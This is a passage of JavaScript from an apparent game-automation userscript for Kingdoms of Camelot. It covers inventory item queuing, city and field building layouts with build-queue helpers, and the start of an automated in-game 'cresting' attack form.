			var nodes = document.getElementsByClassName("pbinv_"+t.type);
			for(var i = 0; i < nodes.length; i++){
				if(nodes[i].checked){
					try{
						t.queue.push(JSON.parse(nodes[i].getAttribute("data-ft")));
					} catch (e){
						logit(inspect(e,7,1));
					}
				}
			}
			if(t.queue.length > 0)
				t.nextqueue();
		}
	},
	
	nextqueue : function (){
		var t = Tabs.Inventory;
		if(!t.isBusy)
			return;
		var div = $("pbinventory_info");
		var m = document.createElement('span');
		if(t.queue.length > 0){
			var item = t.queue[0];
			t.counter = 0;
			t.max = parseIntNan($("pb_inv_"+t.type+"_"+item.id).value);
			m.innerHTML = "<span id='pb_inv_info_"+item.id+"'>Using item "+item.name+" <span id='pb_inv_info_count_"+item.id+"'>1</span> of <span id='pb_inv_info_max_"+item.id+"'>"+t.max+"</span>. Left <span id='pb_inv_info_left_"+item.id+"'>"+(t.max-t.counter)+"</span> <span id='pb_inv_info_extra_"+item.id+"'> </span></span><br />";
		} else {
			m.innerHTML = "Completed! \n";
			t.isBusy = false;
			$("pbinventory_start").value = "Start";
		}
		if(div.firstChild){
			div.insertBefore(m, div.firstChild);
		} else {
			div.appendChild(m);
		}
		t.useitem();
	},
	
	useitem : function (){
		var t = Tabs.Inventory;
		if(!t.isBusy)
			return;
		var item = t.queue[0];
		unsafeWindow.cm.ItemController.use(item.id);
		setTimeout(t.wait, 250, 0);
	},
	
	wait : function (retries){
		var t = Tabs.Inventory;
		if(!t.isBusy)
			return;
		var item = t.queue[0];
		item = unsafeWindow.ksoItems[item.id];
		t.queue[0] = item;
		t.counter++;
		$("pb_inv_info_count_"+item.id).innerHTML = t.counter;
		$("pb_inv_info_left_"+item.id).innerHTML = (t.max-t.counter);
		if(t.counter >= t.max){
			$("pb_inv_info_extra_"+item.id).innerHTML = "All done";
			t.queue.shift();
			t.nextqueue();
			return;
		}
		$("pb_inv_info_extra_"+item.id).innerHTML = "Done. Wait for 1 second..";
		setTimeout(t.useitem, 150);
	},
	
	show: function (){
	
	},
	hide: function (){
	
	}
}


/**************************** Start Up Tab ******************************************/

var buildingIDs = {
    Farm:1,Mine:4,Quarry:3,Sawmill:2,Castle:0,Wall:19,Barracks:13,Cottage:5,RelStat:18,Stable:17,Blacksmith:15,KnightsHall:7,Workshop:16,FeySpire:20,Apothecary:21,RallyPoint:12,Embassy:8,AlcLab:11,Nothing:0,Wall:19
    };
var buildingTypes = {
    type5:"Cottage",type6:"",type7:"KnightsHall",type8:"Embassy",type9:"",type10:"",type11:"AlcLab",type12:"RallyPoint",type13:"Barracks",type14:"WatchTower",type15:"Blacksmith",type16:"Workshop",type17:"Stable",type18:"RelStation",type19:"Wall",type20:"FeySpire",type21:"Apothecary",
};
var cityBuildingNames = {
    Wall:"Wall",Cottage:"Cottage",Barracks:"Barracks",Blacksmith:"Blacksmith",Stable:"Stable",Apothecary:"Apothecary",Workshop:"Workshop",FeySpire:"Fey Spire",Embassy:"Embassy",RelStation:"Relief Station",AlcLab:"Alchemy Lab",WatchTower:"Watch Tower",KnightsHall:"Knights Hall",RallyPoint:"Rally Point",
    };
var fieldBuildingNames = {
    Farm:"Farm",Mine:"Mine",Sawmill:"Mill",Quarry:"Quarry",
    };
var layoutOptions = {
    pos1:"Wall",pos2:"Barracks",pos3:"Cottage",pos4:"RelStation",pos5:"Barracks",pos6:"Barracks",pos7:"Barracks",pos8:"Stable",pos9:"KnightsHall",pos10:"RallyPoint",pos11:"Barracks",pos12:"Barracks",pos13:"Barracks",pos14:"Cottage",pos15:"FeySpire",pos16:"Apothecary",pos17:"Blacksmith",pos18:"Workshop",pos19:"AlcLab",pos20:"Barracks",pos21:"Barracks",pos22:"Barracks",pos23:"Embassy",pos24:"Cottage",pos25:"Barracks",pos26:"Barracks",pos27:"Barracks",pos28:"Cottage",pos29:"Cottage",pos30:"Barracks",pos31:"Barracks",pos32:"Cottage"
    };
var fieldlayoutOptions = {
    pos100:"Farm",pos101:"Sawmill",pos104:"Quarry",pos105:"Mine",pos102:"Mine",pos103:"Mine",pos106:"Mine",pos107:"Mine",pos108:"Mine",pos109:"Mine",pos110:"Mine",pos111:"Mine",pos112:"Mine",pos113:"Mine",pos114:"Mine",pos115:"Mine",pos116:"Mine",pos117:"Mine",pos118:"Mine",pos119:"Mine",pos120:"Mine",pos121:"Mine",pos122:"Mine",pos123:"Mine",pos124:"Mine",pos125:"Mine",pos126:"Mine",pos127:"Mine",pos128:"Mine",pos129:"Mine",pos130:"Mine",pos131:"Mine",pos132:"Mine",pos133:"Mine",pos134:"Mine",pos135:"Mine",pos136:"Mine",pos137:"Mine",pos138:"Mine",pos139:"Mine",pos142:"Mine"
    };  
var AscbuildingIDs = {
    Castle:0,Wall:19,Barracks:13,Cottage:5,KnightsHall:7,FeySpire:20,RallyPoint:12,Embassy:8,AlcLab:11,Nothing:0,Wall:19,Market:10
    };
var AscbuildingTypes = {
    type5:"Cottage",type6:"",type7:"KnightsHall",type8:"Embassy",type9:"",type10:"Market",type11:"AlcLab",type12:"RallyPoint",type13:"Barracks",type14:"WatchTower",type19:"Wall",type20:"FeySpire"
};
var AsccityBuildingNames = {
    Wall:"Wall",Cottage:"Cottage",Barracks:"Barracks",Apothecary:"Apothecary",FeySpire:"Fey Spire",Embassy:"Embassy",AlcLab:"Alchemy Lab",WatchTower:"Watch Tower",KnightsHall:"Knights Hall",RallyPoint:"Rally Point",Market:"Market"
    };

Tabs.startup = {
    tabOrder : 99999,
    tabDisabled : true,
    tabLabel : 'StartUp',
    myDiv : null,
    where: 'City', //Initialize to city by default


    init : function (div){
        var t = Tabs.startup;
        t.myDiv= div;
        var counter=0;
        var m = '<DIV id=pbStartupDiv class=pbStat>New Domain Tools</div><TABLE id=pbNewDomain width=100% height=0% class=pbTab><TR align="center">';
        m += '<DIV id=pblvlcity align=center></div><DIv><INPUT id=addToBuildQueue type=submit value="Add to build queue"></div>';
        m += '<INPUT id=toggleFieldLayout type=submit value="Show Field Layout"><INPUT id=toggleCityLayout type=submit value="Show City Layout"><INPUT id=hideGrids type=submit value="Hide Layouts">';
        m += '<DIV id=mainTitles></div>';    
        m += '<DIV id=gridPicture></div>';
           m += '<DIV id=layoutBoxes></div>';
          
        t.myDiv.innerHTML = m;
        t.city = new CdispCityPicker ('pblvlcity', document.getElementById('pblvlcity'), true, t.ClickCitySelect, 0);      

        document.getElementById('toggleFieldLayout').addEventListener('click', function () {
                t.paintFieldGrid();
        });
        document.getElementById('toggleCityLayout').addEventListener('click', function () {
                t.paintCityGrid();
        });
        document.getElementById('hideGrids').addEventListener('click', function () {
                document.getElementById('mainTitles').innerHTML = "";
                document.getElementById('gridPicture').innerHTML = "";
                document.getElementById('layoutBoxes').innerHTML = "";

        });
        document.getElementById('addToBuildQueue').addEventListener('click', function () {
            if (t.where == "City") t.addCityToQueue();
            if (t.where == "Field") t.addFieldToQueue();
        });
    },
    ClickCitySelect : function(){ //Call this function when users switch to another city
        var t = Tabs.startup;
        switch(t.where){
            case 'City':
                t.paintCityGrid();
                break;
            case 'Field':
                t.paintFieldGrid();
                break;
            default : //If somehow something goes wrong then paint city view by default
                t.paintCityGrid();
                break;
        }
    },
    getCastleLevel:function(){
        var t = Tabs.startup
    var castle = Seed.buildings["city" + t.city.city.id]["pos0"][1];
        switch(castle){
                case "1":fields = 13;break;
                case "2":fields = 16;break;
                case "3":fields = 19;break;
                case "4":fields = 22;break;
                case "5":fields = 25;break;
                case "6":fields = 28;break;
                case "7":fields = 31;break;
                case "8":fields = 34;break;
                case "9":fields = 37;break;
                case "10":fields = 40;break;
                case "11":fields = 41;break;
                case "12":fields = 42;break;
        }
        max = (fields-1) + 100;
        return(max)
    },

    addCityToQueue:function(){
        var t = Tabs.startup;
	var AscCityInd = Seed.cityData.city[t.city.city.id].isPrestigeCity;
            for (pos=1;pos<=32;pos++){
		if(AscCityInd == true) {
                      if  (AscbuildingIDs[document.getElementById('tileID' + pos).value] >0) {
                          if (Seed.buildings['city' + t.city.city.id]["pos" + pos] == undefined){
                        var buildingMode = "build";
                        var cityId =  t.city.city.id;
                        var buildingPos = pos;
                        var buildingType = AscbuildingIDs[document.getElementById('tileID' + pos).value];
                        var buildingLevel = 0;
                        var buildingAttempts = 0;
                        var result = Tabs.build.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
                        var buildingMult = result[0];
                        var buildingTime = result[1];
                        var buildingId = AscbuildingIDs[document.getElementById('tileID' + pos).value];
                        Tabs.build.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);  
                        }                  
                    }
		} else {
			if  (buildingIDs[document.getElementById('tileID' + pos).value] >0) {
                          if (Seed.buildings['city' + t.city.city.id]["pos" + pos] == undefined){
                        var buildingMode = "build";
                        var cityId =  t.city.city.id;
                        var buildingPos = pos;
                        var buildingType = buildingIDs[document.getElementById('tileID' + pos).value];
                        var buildingLevel = 0;
                        var buildingAttempts = 0;
                        var result = Tabs.build.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
                        var buildingMult = result[0];
                        var buildingTime = result[1];
                        var buildingId = buildingIDs[document.getElementById('tileID' + pos).value];
                        Tabs.build.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode); 
                        }                  
                    }
		} 
            }
    },  
    buildExtraLevels:function(rslt,buildItem){
        logit('lvl5FarmDone = ' + Options.lvl5FarmDone + ' lvl3MineDone = ' + Options.lvl3MineDone + ' lvl2BarracksDone = ' + Options.lvl2BarracksDone + ' lvl3WallDone = ' + Options.lvl3WallDone + ' lvl2WorkshopDone = ' + Options.lvl2WorkshopDone + ' lvl5CastleDone = ' + Options.lvl5CastleDone + ' buildingType =' + buildItem.buildingType)
        if (Options.lvl5FarmDone == "false" && buildItem.buildingType == "1") {
            var buildingMode = "build"
               var cityId = buildItem.cityId
               var time = parseInt(buildItem.buildingTime);
            var mult = parseInt(buildItem.buildingMult);
            var attempt = parseInt(buildItem.buildingAttempt);
            var buildingPos   = parseInt(buildItem.buildingPos);
            var buildingType  = 1;
            var buildingLevel = 1; //parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][1]);
            var buildingId    = rslt.buildingId;
            var buildingAttempts = 0;
            for (var bL = 1; bL <5; bL++) {
                var queueId = Tabs.build.loaded_bQ.length;
                var result = Tabs.build.calculateQueueValues(cityId, bL, buildingType, buildingMode);
                var buildingMult = result[0];
                var buildingTime = result[1];
                queueId = queueId ;
                Tabs.build.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult,buildingMode);
                Tabs.build._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
               }
               Options.lvl5FarmDone = "true";
               saveOptions();
        }
        if (Options.lvl3MineDone == "false" && buildItem.buildingType == "4") {
            var buildingMode = "build"
               var cityId = buildItem.cityId
               var time = parseInt(buildItem.buildingTime);
            var mult = parseInt(buildItem.buildingMult);
            var attempt = parseInt(buildItem.buildingAttempt);
            var buildingPos   = parseInt(buildItem.buildingPos);
            var buildingType  = 4;
            var buildingLevel = 1; //parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][1]);
            var buildingId    = rslt.buildingId;
            var buildingAttempts = 0;
            for (var bL = 1; bL <3; bL++) {
                var queueId = Tabs.build.loaded_bQ.length;
                var result = Tabs.build.calculateQueueValues(cityId, bL, buildingType, buildingMode);
                var buildingMult = result[0];
                var buildingTime = result[1];
                queueId = queueId ;
                Tabs.build.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult,buildingMode);
                Tabs.build._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
               }
               Options.lvl3MineDone = "true";
               saveOptions();
        }
        if (Options.lvl2BarracksDone == "false" && buildItem.buildingType == "13") {
            var buildingMode = "build"
               var cityId = buildItem.cityId
               var time = parseInt(buildItem.buildingTime);
            var mult = parseInt(buildItem.buildingMult);
            var attempt = parseInt(buildItem.buildingAttempt);
            var buildingPos   = parseInt(buildItem.buildingPos);
            var buildingType  = 13;
            var buildingLevel = 1; //parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][1]);
            var buildingId    = rslt.buildingId;
            var buildingAttempts = 0;
            for (var bL = 1; bL <2; bL++) {
                var queueId = Tabs.build.loaded_bQ.length;
                var result = Tabs.build.calculateQueueValues(cityId, bL, buildingType, buildingMode);
                var buildingMult = result[0];
                var buildingTime = result[1];
                queueId = queueId ;
                Tabs.build.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult,buildingMode);
                Tabs.build._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
               }
               Options.lvl2BarracksDone = "true";
               saveOptions();
        }
        if (Options.lvl3WallDone == "false" && buildItem.buildingType == "19") { //WALL
            var buildingMode = "build"
               var cityId = buildItem.cityId
               var time = parseInt(buildItem.buildingTime);
            var mult = parseInt(buildItem.buildingMult);
            var attempt = parseInt(buildItem.buildingAttempt);
            var buildingPos   = parseInt(buildItem.buildingPos);
            var buildingType  = 19;
            var buildingLevel = 1;
            var buildingId    = rslt.buildingId;
            var buildingAttempts = 0;
            for (var bL = 1; bL <3; bL++) {
                var queueId = Tabs.build.loaded_bQ.length;
                var result = Tabs.build.calculateQueueValues(cityId, bL, buildingType, buildingMode);
                var buildingMult = result[0];
                var buildingTime = result[1];
                queueId = queueId ;
                Tabs.build.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult,buildingMode);
                Tabs.build._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
               }
               Options.lvl3WallDone = "true";
               saveOptions();
        }
        if (Options.lvl2WorkshopDone == "false" && buildItem.buildingType == "16") { //workshop
            var buildingMode = "build"
               var cityId = buildItem.cityId
               var time = parseInt(buildItem.buildingTime);
            var mult = parseInt(buildItem.buildingMult);
            var attempt = parseInt(buildItem.buildingAttempt);
            var buildingPos   = parseInt(buildItem.buildingPos);
            var buildingType  = 16;
            var buildingLevel = 1; //parseInt(Seed.buildings['city' + cityId]["pos" + buildingPos][1]);
            var buildingId    = rslt.buildingId;
            var buildingAttempts = 0;
            for (var bL = 1; bL <=2; bL++) {
                var queueId = Tabs.build.loaded_bQ.length;
                var result = Tabs.build.calculateQueueValues(cityId, bL, buildingType, buildingMode);
                var buildingMult = result[0];
                var buildingTime = result[1];
                queueId = queueId ;
                Tabs.build.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, bL, buildingAttempts, buildingMult,buildingMode);
                Tabs.build._addTab(queueId, cityId, buildingType, buildingTime, bL, buildingAttempts, buildingMode);
               }
               Options.lvl2WorkshopDone = "true";
               saveOptions();
        }

    },

    addFieldToQueue:function(){
        var t = Tabs.startup;
        var max = t.getCastleLevel();
        Options.lvl5FarmDone = "false";
            for (pos=100;pos<=max;pos++){
                    if  (buildingIDs[document.getElementById('tileID' + pos).value] >0) {
                        if (Seed.buildings['city' + t.city.city.id]["pos" + pos] == undefined){
                        var buildingMode = "build";
                        var cityId =  t.city.city.id;
                        var buildingPos = pos;
                        var buildingType = buildingIDs[document.getElementById('tileID' + pos).value];
                        var buildingLevel = 0;
                        var buildingAttempts = 0;
                        var result = Tabs.build.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
                        var buildingMult = result[0];
                        var buildingTime = result[1];
                        var buildingId = buildingIDs[document.getElementById('tileID' + pos).value];
                        Tabs.build.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);                      
                        }
                }
            }
    },  

    paintCityGrid:function(cityDiv){
        var t = Tabs.startup;
        t.myDiv = cityDiv;
        t.where = "City";
        var counter = 0;
	var AscCityInd = Seed.cityData.city[t.city.city.id].isPrestigeCity;
        var cityGrid = '<img src="http://koc-power-bot.googlecode.com/svn/trunk/CityTileIDs.jpg">';
	var asccityGrid = '<img src="http://koc-power-bot.googlecode.com/svn/trunk/AscCityTileIDs.jpg">';
        document.getElementById('gridPicture').innerHTML = "";
	if(AscCityInd == true) {
		document.getElementById('gridPicture').innerHTML = asccityGrid;
	} else {
		document.getElementById('gridPicture').innerHTML = cityGrid;
	}
        var message='<TABLE id=pbLayoutBoxes width=100% height=0%><INPUT id=showDefaults type=submit value="Load Defaults"><INPUT id=setDefaults type=submit value="Set Defaults">';

        for (k=1;k<=32;k++){
            if (k==1){
                counter++
                message += '<TD>Tile1<SELECT id=tileID1><OPTION value="Wall">Wall</option>'
            }else{
            	counter++;
            	message += '<TD>Tile'+k+'<SELECT id=tileID'+k+'><OPTION value="Nothing">---Select---</option>'
		if(AscCityInd == true) {
			for (kk in AsccityBuildingNames){
                      		message += '<OPTION value='+kk+'>'+AsccityBuildingNames[kk]+'</option>';
                	}
		} else {
			for (kk in cityBuildingNames){
                      		message += '<OPTION value='+kk+'>'+cityBuildingNames[kk]+'</option>';
			}
		}
            	message += '</options>';
        	if (counter % 4 == 0)message+='</tr>';
        	}
        }
        document.getElementById('layoutBoxes').innerHTML = message;
            for (pos=1;pos<=32;pos++){
		if(AscCityInd == true) {
                	if (Seed.buildings['city' + t.city.city.id]["pos" + pos] != undefined){
                    	document.getElementById('tileID' + pos).value = AscbuildingTypes["type"+Seed.buildings['city' +t.city.city.id]["pos"+pos][0]];
                   	 document.getElementById('tileID' + pos).disabled = true;
                    	logit("POS = " + pos + ' ' + AscbuildingTypes["type"+Seed.buildings['city' +t.city.city.id]["pos"+pos][0]] + ' TYPE = ' + Seed.buildings['city' +t.city.city.id]["pos"+pos][0]);
                	}
		} else {
                	if (Seed.buildings['city' + t.city.city.id]["pos" + pos] != undefined){
                    	document.getElementById('tileID' + pos).value = buildingTypes["type"+Seed.buildings['city' +t.city.city.id]["pos"+pos][0]];
                   	 document.getElementById('tileID' + pos).disabled = true;
                    	logit("POS = " + pos + ' ' + buildingTypes["type"+Seed.buildings['city' +t.city.city.id]["pos"+pos][0]] + ' TYPE = ' + Seed.buildings['city' +t.city.city.id]["pos"+pos][0]);
                	}
		}
            }
       
        document.getElementById('showDefaults').addEventListener('click', function(){
            for (pos=1;pos<=32;pos++){
                //logit(document.getElementById('tileID' + i).value)
                if (Seed.buildings['city' + t.city.city.id]["pos" + pos] == undefined){
                    document.getElementById('tileID' + pos).value = layoutOptions['pos' +pos];
                }else{
                    //logit(unsafeWindow.buildingcost["bdg" + Seed.buildings['city' +t.city.city.id]["pos"+pos][0]][0]);

                    document.getElementById('tileID' + pos).value = unsafeWindow.buildingcost["bdg" + Seed.buildings['city' +t.city.city.id]["pos"+pos][0]][0];
                    document.getElementById('tileID' + pos).disabled = true;
                }
               }
        });
        document.getElementById('setDefaults').addEventListener('click', function(){
            for (pos=1;pos<=32;pos++){
                layoutOptions['pos'+pos] = document.getElementById('tileID' + pos).value

            }
            saveLayoutOptions();
        });
        //code for set buttons
    },


    paintFieldGrid:function(fieldsDiv){
        var t = Tabs.startup;
        t.myDiv = fieldsDiv;
        t.where = "Field";
        var counter = 0;
        var fields = 13;
        var max = t.getCastleLevel();
        var fieldGrid = '<img src="http://koc-power-bot.googlecode.com/svn/trunk/FieldsTileIDs.jpg">';
        document.getElementById('gridPicture').innerHTML = "";
        document.getElementById('gridPicture').innerHTML = fieldGrid;
        var mess='<TABLE id=pbLayoutBoxes width=100% height=0%><INPUT id=showFieldDefaults type=submit value="Load Defaults"><INPUT id=setFieldDefaults type=submit value="Set Defaults">';
        for (k=100;k<=max;k++){
            if (k != 140 && k != 141){
                counter++
                mess += '<TD>Tile'+k+'<SELECT id=tileID'+k+'><OPTION value="Nothing">---Select---</option>'
                      for (kk in fieldBuildingNames){
                          mess += '<OPTION value='+kk+'>'+ fieldBuildingNames[kk]+'</option>';
                    }
                mess += '</options>';
            if (counter % 4 == 0)mess+='<tr>';
            }
        }
        document.getElementById('layoutBoxes').innerHTML = mess;
        for (pos=100;pos<=max;pos++){
                if (Seed.buildings['city' + t.city.city.id]["pos" + pos] != undefined){
                    document.getElementById('tileID' + pos).value = unsafeWindow.buildingcost["bdg" + Seed.buildings['city' +t.city.city.id]["pos"+pos][0]][0];
                    document.getElementById('tileID' + pos).disabled = true;
                }
            }
  
    document.getElementById('showFieldDefaults').addEventListener('click', function(){
            for (pos=100;pos<=max;pos++){
                //logit(document.getElementById('tileID' + i).value)
                if (Seed.buildings['city' + t.city.city.id]["pos" + pos] == undefined){
                    document.getElementById('tileID' + pos).value = fieldlayoutOptions['pos' +pos];
                }else{
                    //logit(unsafeWindow.buildingcost["bdg" + Seed.buildings['city' +t.city.city.id]["pos"+pos][0]][0]);
                    //logit(unsafeWindow.buildingcost["bdg" + Seed.buildings['city' +t.city.city.id]["pos"+pos][0]][0])
                    document.getElementById('tileID' + pos).value = unsafeWindow.buildingcost["bdg" + Seed.buildings['city' +t.city.city.id]["pos"+pos][0]][0];
                    document.getElementById('tileID' + pos).disabled = true;
                }
               }
    });
    document.getElementById('setFieldDefaults').addEventListener('click', function(){
            for (pos=100;pos<=max;pos++){
                fieldlayoutOptions['pos'+pos] = document.getElementById('tileID' + pos).value;
            }
            savefieldlayoutOptions();
    });
    },
  
  
    show : function(){},
    hide : function(){},
} 
/*********************************  Crest Tab ***********************************/
 Tabs.Crest = {
  tabOrder : 70,
  myDiv : null,
    tabDisabled : !ENABLE_SAMPLE_TAB,
  rallypointlevel:null,
  error_code: 0,
  knt:{},

/** window display **/
  init : function (div){
    var t = Tabs.Crest;
    Options.crestMarchError = 0;

    setInterval(t.sendCrestReport, 1*60*1000);  
    t.timer = setTimeout(function(){ t.Rounds(1,0,0);}, CrestOptions.interval*1000);


    t.myDiv = div;
    var selbut=0;
    AddSubTabLink('Crest',t.toggleCrestState, 'CrestToggleTab');
    var m = '<DIV id=pbTowrtDivF class=pbStat>AUTOMATED CRESTING FUNCTION</div><TABLE id=pbcrestfunctions width=100% height=0% class=pbTab><TR align="center">';
     if (Options.crestRunning == false) {
           m += '<TD><INPUT id=Cresttoggle type=submit value="Crest = OFF"></td>';
	   document.getElementById('CrestToggleTab').innerHTML = '<span style="color: #CCC">Crest: Off</span>'
       } else {
           m += '<TD><INPUT id=Cresttoggle type=submit value="Crest = ON"></td>';
	   document.getElementById('CrestToggleTab').innerHTML = '<span style="color: #FFFF00">Crest: On</span>'
       }



    m += '<TD><INPUT id=CrestHelp type=submit value="HELP"></td>';
    m += '<td><INPUT id=showCrestTargets type=submit value="Show Targets"></td>';
    m += '<TD><INPUT id=pbsendreport type=checkbox '+ (Options.crestreport?' CHECKED':'') +'\> Send Crest report every ';
    m += '<INPUT id=pbsendcrestreportint value='+ Options.CrestMsgInterval +' type=text size=3 \> hours </td>\
          <TD>Attack interval <INPUT type=text size=3 value='+Options.Crestinterval+' id=pbcrest_interval />seconds</tr></table>';
  
    m += '<DIV id=pbOpt class=pbStat>CRESTING OPTIONS</div><TABLE id=pbcrestopt     width=100% height=0% class=pbTab><TR align="center"></table>';
    m += '<DIV style="margin-bottom:10px;">Crest from city: <span id=crestcity></span></div>';
    
    m += '<TABLE class=ptTab><TR><TD>Wild coords: X:<INPUT id=pbcrestx type=text size=3 maxlength=3 value=""></td>';
    m += '<TD>Y:<INPUT id=pbcresty type=text size=3 maxlength=3 value=""></td></tr>';
    m += '<TR><TD><INPUT type=checkbox id=pbcrest_iswild CHECKED /> Is Wild </td></tr></table>';
   

    m += '<TABLE class=ptTab><TR><TD><INPUT type=checkbox id=pbcrest_rnd1 CHECKED /></td><TD>Wave <b>1</b>(initial): </td><TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_1_30.png></td><TD><INPUT id=R1ST type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_30.png></td><TD><INPUT id=R1MM type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_3_30.png></td><TD><INPUT id=R1Scout type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_30.png></td><TD><INPUT id=R1Pike type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_5_30.png></td><TD><INPUT id=R1Sword type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_6_30.png></td><TD><INPUT id=R1Arch type=text size=7 maxlength=6 value=0></td></tr>';
    m += '<tr><td></td><td></td><TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_7_30.png></td><TD><INPUT id=R1LC type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_8_30.png></td><TD><INPUT id=R1HC type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_9_30.png></td><TD><INPUT id=R1SW type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_30.png></td><TD><INPUT id=R1Ball type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_11_30.png></td><TD><INPUT id=R1Ram type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_30.png></td><TD><INPUT id=R1Cat type=text size=7 maxlength=6 value=0></td></tr><tr><td>&nbsp;</td><td>&nbsp;</td></tr><tr><td>&nbsp;</td><td>&nbsp;</td></tr>';
    
    m += '<TR><TD><INPUT type=checkbox id=pbcrest_rnd2 CHECKED /></td><TD>Wave <b>2(recurring)</b>: </td><TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_1_30.png></td><TD><INPUT id=R2ST type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_30.png></td><TD><INPUT id=R2MM type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_3_30.png></td><TD><INPUT id=R2Scout type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_30.png></td><TD><INPUT id=R2Pike type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_5_30.png></td><TD><INPUT id=R2Sword type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_6_30.png></td><TD><INPUT id=R2Arch type=text size=7 maxlength=6 value=0></td></tr>';
    m += '<tr><td></td><td></td><TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_7_30.png></td><TD><INPUT id=R2LC type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_8_30.png></td><TD><INPUT id=R2HC type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_9_30.png></td><TD><INPUT id=R2SW type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_30.png></td><TD><INPUT id=R2Ball type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_11_30.png></td><TD><INPUT id=R2Ram type=text size=7 maxlength=6 value=0></td>';
    m += '<TD>&nbsp;&nbsp;<img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_30.png></td><TD><INPUT id=R2Cat type=text size=7 maxlength=6 value=0></td></tr></table>';
    m += '<DIV style="text-align:center; margin-top:15px"><INPUT id=pbSaveRouteCrest type=submit value="Add Attack"></div>';
    
    t.myDiv.innerHTML = m;
    
    document.getElementById('pbsendreport').addEventListener('change', function(){
        Options.crestreport = document.getElementById('pbsendreport').checked;
        saveOptions();
    }, false);
    document.getElementById('pbsendcrestreportint').addEventListener('change', function(){
        Options.CrestMsgInterval = parseInt(document.getElementById('pbsendcrestreportint').value);
        saveOptions();
    }, false);
    $("pbcrest_interval").addEventListener('change', function(e){
        Options.Crestinterval = parseIntNan(e.target.value);
        saveOptions();
    },false);
    
    for (var i=0;i<Seed.cities.length;i++){
        if (CrestOptions.CrestCity == Seed.cities[i][0]){
            selbut=i;
            break;
        }
    }
        
    t.tcp = new CdispCityPicker ('crestcityselect', document.getElementById('crestcity'), true, t.clickCitySelect, selbut);
    
    if (CrestOptions.CrestCity == 0) {
